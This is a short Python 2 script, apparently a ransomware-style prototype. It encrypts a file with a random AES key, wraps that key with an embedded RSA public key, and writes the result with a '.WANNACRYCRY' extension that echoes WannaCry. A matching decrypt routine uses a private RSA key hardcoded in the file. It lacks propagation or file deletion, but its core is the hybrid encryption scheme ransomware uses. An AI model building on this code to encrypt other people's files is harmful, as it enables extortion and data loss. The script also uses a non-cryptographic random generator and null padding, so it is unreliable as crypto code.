#!/usr/bin/env python
# -*- coding: utf-8 -*-
from Crypto.Cipher import AES
import random,rsa,os

x = [chr(y) for y in range(1,127)]
key = ''.join(random.sample(x,16)) 
iv = ''.join(random.sample(x,16))

RSA_public_string = u'-----BEGIN RSA PUBLIC KEY-----\nMIGJAoGBALvD8lK3bgYhRPD3ybKZlo4AJLe6WrXR8SEVY09+W9IXOfl1mCjkxkko\nbykxfevl84qMgrHbXB+7YWN9x5Mgw3jWxSsg1RJcWP+4WKvx/n7i6c4f9R6ndfEC\n4Upa4ElomhiBt426eaCm5zbnUO3i2jc358b/1oHtsLQKBl6qqatXAgMBAAE=\n-----END RSA PUBLIC KEY-----\n'
RSA_Pub_key = rsa.PublicKey.load_pkcs1(RSA_public_string)

Encrypt_key_iv = rsa.encrypt(key+iv, RSA_Pub_key)
Encrypt_key_iv_padding = Encrypt_key_iv+'\0'*(200-len(Encrypt_key_iv))

def Encrypt_File(PATH):
    f = open(PATH,'rb')
    filebuffsize = 100*1024*1024
    w = open(PATH+'.WANNACRYCRY','wb')
    AES_cryptor = AES.new(key,AES.MODE_CBC,iv)
    w.write(Encrypt_key_iv_padding)
    while True:
        g = f.read(filebuffsize)
        length = len(g)
        if length == 0:
            print 'done!!'
            break
        if length < filebuffsize:
            g += (16-length%16)*'\0'
            w.write(AES_cryptor.encrypt(g))
            print 'done!!'
            break
        w.write(AES_cryptor.encrypt(g))
        print '++go--->'
    f.close()
    w.close()
    
def Decrypt_File(PATH):
    RSA_private_string = u'-----BEGIN RSA PRIVATE KEY-----\nMIICYAIBAAKBgQC7w/JSt24GIUTw98mymZaOACS3ulq10fEhFWNPflvSFzn5dZgo\n5MZJKG8pMX3r5fOKjIKx21wfu2FjfceTIMN41sUrINUSXFj/uFir8f5+4unOH/Ue\np3XxAuFKWuBJaJoYgbeNunmgpuc251Dt4to3N+fG/9aB7bC0CgZeqqmrVwIDAQAB\nAoGAdgw8ZnrCZoI2KNVwbqQXPpGihAxaiWNDmUwsEsdbjRtjLI4dKuCiNU6BjMF7\n7Hq3Ag1TAeTq51xUX0utOoj0MvWWR99ajF1E9zEEdSbptIXXV+eEwQYVZ3OOPBvh\ne2MeXEqc1cRdaMc7MjkfT8HVTdNybFign4fBtdY29uyM4dECRQD1PRDpw5t85He1\nrYk1vxtahMlKzwvpQrdJlInldn6cRxqZ72ZZjCNQFHY97dNIQ5iOPxg5GQX2n0Ej\n6oIu2Cw6tfdMCQI9AMQBPsY3xbW9du6ptruOOQyL2/oCSOs/M/o6cfpSUQX1Ijmo\nEe6gK/vErUajm/HgUEyMWpfHlSVBpsXUXwJFAMW906FqZDm0TwJjRzvbOMcoQtbb\nVBNmBDyEVRx9C2Ifw0dUTgbuhJrRpPYSika+mog4P+PqVXCiwPeg5A+5pxBAIYNh\nAjxivuHaSNTRV69oU5Yc7WzuVjOvw6Dq63+LLBCp9Pie0L26YGMQXh9qis5lDR4O\ngFzUA83MM59/EpErj28CRCrYQEUUHnbA4cJihxKV7ZusZ/30R0IInTeH3U+bzum5\nKan0fug4DN6IrKk89jQGvr3y6rGFluiG4LS1LO46Rh/Zj+wh\n-----END RSA PRIVATE KEY-----\n'
    RSA_Private_Key = rsa.PrivateKey.load_pkcs1(RSA_private_string)

    f = open(PATH,'rb')
    w = open(PATH.rstrip('\.WANNACRYCRY'),'wb')
    g = f.read(200).rstrip('\0')
    key_iv_string = rsa.decrypt(g, RSA_Private_Key)
    key = key_iv_string[:16]
    iv = key_iv_string[16:]
    AES_decryptor = AES.new(key,AES.MODE_CBC,iv)
    filebuffsize = 100*1024*1024

    while True:
        g = f.read(filebuffsize)
        length = len(g)
        if length == 0:
            print 'done!!'
            break
        if length < filebuffsize:
            w.write(AES_decryptor.decrypt(g).rstrip('\0'))
            print 'done!!'
            break
        w.write(AES_decryptor.decrypt(g))
        print '--go--->'
    f.close()
    w.close()
Encrypt_File(r'E:\Movie\xxx.mp4')
Decrypt_File(r'E:\Movie\xxx.mp4.WANNACRYCRY')